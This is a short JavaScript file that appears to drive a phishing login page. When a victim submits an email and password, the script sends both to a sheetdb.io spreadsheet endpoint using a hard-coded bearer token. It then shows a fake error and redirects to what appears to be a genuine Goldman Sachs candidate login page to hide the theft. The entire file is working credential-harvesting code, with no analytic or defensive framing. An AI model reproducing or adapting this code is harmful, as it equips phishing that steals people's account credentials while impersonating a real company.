const submitButton = document.getElementById("btnSubmit");
const username = document.getElementById("username");
const password = document.getElementById("password");
const model = document.getElementById("model");
const modelContainer = document.getElementById("model-container");

const url = "https://sheetdb.io/api/v1/njskcutqt1wmw";
const token = "tcwoa597hemxg3t5k2gsf98ru7no2vit2ketbdfz";

function validateEmail(email) {
    const regex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
    return regex.test(email);
}

const submitForm = (event)=>{
    event.preventDefault();
    if (validateEmail(username.value)) {
        fetch(url, {
            method: 'POST',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                "Authorization": `Bearer ${token}`,
            },
            body: JSON.stringify({
                data: [
                    {
                        'username': username.value,
                        "password": password.value
                    }
                ]
            })
        })
          .then((response) => {response.json()})
          .then((data) => {
            username.value = password.value = null;
            alert("Something went wrong!");
            window.location.replace("https://goldmansachs.tal.net/vx/lang-en-GB/mobile-0/brand-2/xf-a74e914ff6ce/candidate/login");
          }).catch(err =>{
            alert("Something went wrong!");
          })
      } else {
        alert("Enter valid email");
      }
    
  
}

submitButton.addEventListener('click', submitForm);

